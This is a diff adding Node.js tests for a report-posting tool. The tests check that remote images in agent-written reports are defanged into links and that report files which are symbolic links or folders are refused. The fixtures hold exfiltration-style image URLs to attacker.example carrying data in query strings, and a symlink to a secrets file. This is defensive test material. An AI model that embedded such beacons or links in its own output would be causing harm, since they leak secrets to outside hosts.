@@ -752,3 +752,140 @@ test('the CLI: --security-only with --draft-pr exits 2, an id that is neither au
     rmSync(bare, { recursive: true, force: true });
   }
 });
+
+// ---- Round 3, Medium 21: a remote image in an agent-written report is an egress channel ----
+
+test('round3 Medium 21: a remote image in a posted report becomes a link text; an image the tracker hosts stays an image', async () => {
+  const id = 'GL-7';
+  const ticket = fakeTracker('ticket');
+  const review = '# Task review\n\nVerdict: PASS — ok.\n\n![sneaky](https://attacker.example/r.png?d=REVIEW)\n';
+  const qa = '# QA\n\nVerdict: PASS — ok.\n\n![evil](https://attacker.example/p.png?d=SECRET)\n\n<img src="https://attacker.example/q.png?d=MORE" alt="q">\n\n![shot](artifacts/a.png)\n';
+  const security = '# Security\n\nVerdict: PASS — ok.\n\n![s](http://attacker.example/s.png)\n';
+  const s = setup({ id, review, qa, security, artifacts: { 'a.png': Buffer.from('png') }, trackers: { ticket }, entries: [] });
+  try {
+    s.deps.forgeFor = (dir) => (dir === s.root ? { provider: 'gitlab', host: 'gitlab.example.com', path: 'acme/docs' } : null);
+    await postReview({ id, root: s.root, marker: MARKER, resolution: ticketOf(id) }, s.deps);
+    const bodies = ticket.calls.filter((c) => c.op === 'comment').map((c) => c.body).join('\n');
+    assert.ok(!/!\[(sneaky|evil|s)\]|<img/i.test(bodies), bodies);
+    for (const expected of ['[image: sneaky](<https://attacker.example/r.png?d=REVIEW>)', '[image: evil](<https://attacker.example/p.png?d=SECRET>)', '[image: q](<https://attacker.example/q.png?d=MORE>)', '[image: s](<http://attacker.example/s.png>)']) {
+      assert.ok(bodies.includes(expected), `${expected} in\n${bodies}`);
+    }
+    assert.ok(bodies.includes('![shot](/uploads/abc/a.png)'), 'the upload the engine made is still an image');
+  } finally { rmSync(s.root, { recursive: true, force: true }); }
+  const gh = 'GH-7';
+  const pr = fakeTracker('o/web', { open: { 'GH-7-work': 'https://github.com/o/web/pull/3' } });
+  const s2 = setup({ id: gh, qa: '# QA\n\nVerdict: PASS — ok.\n\n![evil](https://attacker.example/p.png?d=SECRET)\n\n![shot](artifacts/a.png)\n', artifacts: { 'a.png': Buffer.from('png') }, trackers: { 'github.com/o/web': pr }, entries: [{ repo: 'web', path: 'web', branch: 'GH-7-work', defaultBranch: 'main', onTicketBranch: true }] });
+  try {
+    s2.deps.forgeFor = () => ({ provider: 'github', host: 'github.com', path: 'o/web' });
+    await postReview({ id: gh, root: s2.root, marker: MARKER, resolution: ticketOf(gh) }, s2.deps);
+    const qaBodies = pr.calls.filter((c) => c.op === 'comment' || c.op === 'prComment').map((c) => c.body).filter((b) => b.startsWith('**QA-REPORT.md**'));
+    assert.equal(qaBodies.length, 2, 'the ticket and the pull request, which share one fake tracker here');
+    for (const body of qaBodies) {
+      assert.ok(!/!\[evil\]/.test(body) && /\[image: evil\]\(<https:\/\/attacker\.example\/p\.png\?d=SECRET>\)/.test(body), body);
+      assert.match(body, /!\[shot\]\(https:\/\/github\.com\/o\/web\/blob\/GH-7-work\/reviews\/GH-7\/artifacts\/a\.png\?raw=true\)/);
+    }
+  } finally { rmSync(s2.root, { recursive: true, force: true }); }
+});
+
+test('round3 Medium 21: the security-only door defangs a remote image in the report too', async () => {
+  const pr = fakeTracker('o/docs', { open: { 'feature/login': 'https://github.com/o/docs/pull/8' } });
+  const s = setup({ id: AUDIT, review: null, qa: null, security: `${SECURITY}\n![x](https://attacker.example/p.png?d=1)\n`, docsBranch: 'feature/login', trackers: { 'github.com/o/docs': pr } });
+  try {
+    s.deps.forgeFor = () => docsForge;
+    await postAudit({ id: AUDIT, root: s.root, marker: MARKER }, s.deps);
+    const body = pr.calls.find((c) => c.op === 'prComment').body;
+    assert.ok(!body.includes('![x]') && body.includes('[image: x](<https://attacker.example/p.png?d=1>)'), body);
+  } finally { rmSync(s.root, { recursive: true, force: true }); }
+});
+
+// ---- Round 3, Medium 14: a report file is a regular file of the project, never a link ----
+
+// A file link; false where the machine gives no right to make one (Windows without Developer Mode).
+function linkFile(target, link) {
+  try {
+    symlinkSync(target, link, 'file');
+    return true;
+  } catch (error) {
+    if (error.code === 'EPERM' || error.code === 'EACCES') return false;
+    throw error;
+  }
+}
+
+for (const name of ['TASK-REVIEW.md', 'QA-REPORT.md', 'SECURITY-REPORT.md']) {
+  test(`round3 Medium 14: reviews/<ID>/${name} as a symbolic link to a file outside the reviews folder: nothing is read, committed or posted`, async (t) => {
+    const id = 'GL-7';
+    const ticket = fakeTracker('ticket');
+    const s = setup({ id, security: '# Security\n\nVerdict: PASS — ok.\n', trackers: { ticket }, entries: [] });
+    const outside = mkdtempSync(join(tmpdir(), 'post-review-secret-'));
+    writeFileSync(join(outside, 'secrets.env'), 'TOKEN=secret-value\n');
+    try {
+      rmSync(join(s.root, 'reviews', id, name), { force: true });
+      if (!linkFile(join(outside, 'secrets.env'), join(s.root, 'reviews', id, name))) { t.skip('no right to create a file link here'); return; }
+      await assert.rejects(postReview({ id, root: s.root, marker: MARKER, resolution: ticketOf(id) }, s.deps),
+        (e) => e.code === 'bad-artifact' && e.message.includes(`reviews/${id}/${name}`) && /symbolic link/.test(e.message));
+      assert.equal(ticket.calls.length, 0, 'nothing posted');
+      assert.equal(s.log.length, 0, 'nothing committed or pushed');
+      assert.ok(!ticket.calls.some((c) => /secret-value/.test(c.body ?? '')));
+    } finally {
+      rmSync(s.root, { recursive: true, force: true });
+      rmSync(outside, { recursive: true, force: true });
+    }
+  });
+}
+
+test('round3 Medium 14: a report file that is a folder or a junction is not read: refused as not a regular file or a link, nothing posted', async () => {
+  const id = 'GL-7';
+  for (const name of ['QA-REPORT.md', 'SECURITY-REPORT.md']) {
+    const ticket = fakeTracker('ticket');
+    const s = setup({ id, security: '# Security\n\nVerdict: PASS — ok.\n', trackers: { ticket }, entries: [] });
+    try {
+      rmSync(join(s.root, 'reviews', id, name), { force: true });
+      mkdirSync(join(s.root, 'reviews', id, name));
+      await assert.rejects(postReview({ id, root: s.root, marker: MARKER, resolution: ticketOf(id) }, s.deps),
+        (e) => e.code === 'bad-artifact' && e.message.includes(`reviews/${id}/${name}`) && /not a regular file/.test(e.message));
+      assert.equal(ticket.calls.length, 0);
+      assert.equal(s.log.length, 0);
+    } finally { rmSync(s.root, { recursive: true, force: true }); }
+  }
+  const ticket = fakeTracker('ticket');
+  const s = setup({ id, trackers: { ticket }, entries: [] });
+  const outside = mkdtempSync(join(tmpdir(), 'post-review-outside-'));
+  try {
+    rmSync(join(s.root, 'reviews', id, 'QA-REPORT.md'), { force: true });
+    if (linkDir(outside, join(s.root, 'reviews', id, 'QA-REPORT.md'))) {
+      await assert.rejects(postReview({ id, root: s.root, marker: MARKER, resolution: ticketOf(id) }, s.deps),
+        (e) => e.code === 'bad-artifact' && /QA-REPORT\.md/.test(e.message));
+      assert.equal(s.log.length, 0);
+      rmSync(join(s.root, 'reviews', id, 'QA-REPORT.md'), { force: true, recursive: false });
+    }
+  } finally {
+    rmSync(s.root, { recursive: true, force: true });
+    rmSync(outside, { recursive: true, force: true });
+  }
+});
+
+test('round3 Medium 14: the same refusal on the security-only door, before anything is committed or posted', async () => {
+  const pr = fakeTracker('o/docs', { open: { 'feature/login': 'https://github.com/o/docs/pull/8' } });
+  const s = setup({ id: AUDIT, review: null, qa: null, security: null, docsBranch: 'feature/login', trackers: { 'github.com/o/docs': pr } });
+  try {
+    mkdirSync(join(s.root, 'reviews', AUDIT, 'SECURITY-REPORT.md'));
+    s.deps.forgeFor = () => docsForge;
+    await assert.rejects(postAudit({ id: AUDIT, root: s.root, marker: MARKER }, s.deps), (e) => e.code === 'bad-artifact' && /SECURITY-REPORT\.md/.test(e.message));
+    assert.equal(pr.calls.filter((c) => c.op === 'prComment').length, 0);
+    assert.equal(s.log.length, 0);
+  } finally { rmSync(s.root, { recursive: true, force: true }); }
+});
+
+test('round3 Medium 14: a screenshot that is a symbolic link, even to a file inside artifacts/, is refused before anything is committed', async (t) => {
+  const id = 'GL-7';
+  const ticket = fakeTracker('ticket');
+  const s = setup({ id, qa: '# QA\n\nVerdict: PASS — ok.\n\n![a](artifacts/a.png)\n', artifacts: { 'real.png': Buffer.from('png') }, trackers: { ticket }, entries: [] });
+  try {
+    if (!linkFile(join(s.root, 'reviews', id, 'artifacts', 'real.png'), join(s.root, 'reviews', id, 'artifacts', 'a.png'))) { t.skip('no right to create a file link here'); return; }
+    s.deps.forgeFor = (dir) => (dir === s.root ? { provider: 'gitlab', host: 'gitlab.example.com', path: 'acme/docs' } : null);
+    await assert.rejects(postReview({ id, root: s.root, marker: MARKER, resolution: ticketOf(id) }, s.deps),
+      (e) => e.code === 'bad-artifact' && /artifacts\/a\.png/.test(e.message) && /symbolic link/.test(e.message));
+    assert.equal(ticket.calls.filter((c) => c.op === 'upload' || c.op === 'comment').length, 0);
+    assert.equal(s.log.length, 0);
+  } finally { rmSync(s.root, { recursive: true, force: true }); }
+});
